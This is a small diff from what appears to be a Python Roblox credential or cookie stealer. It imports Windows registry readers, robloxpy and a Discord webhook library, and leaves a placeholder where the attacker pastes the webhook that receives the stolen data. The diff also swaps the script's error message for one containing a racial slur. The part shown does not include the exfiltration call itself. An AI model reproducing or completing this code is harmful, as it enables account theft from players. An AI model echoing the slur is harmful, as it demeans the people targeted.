@@ -15,14 +15,13 @@
 
 try:
     import base64, codecs
-    import requests
     from winreg import OpenKey, HKEY_CURRENT_USER, EnumValue
     import robloxpy
     import json
     import os
     from discordwebhook import *
 except:
-    print("Failed to import libraies. Please contact Mani.#0001 at discord to fix this problem.")
+    print("go install libraries nigga")
     exit()
 
 webhookk = "heh" # put webhook here
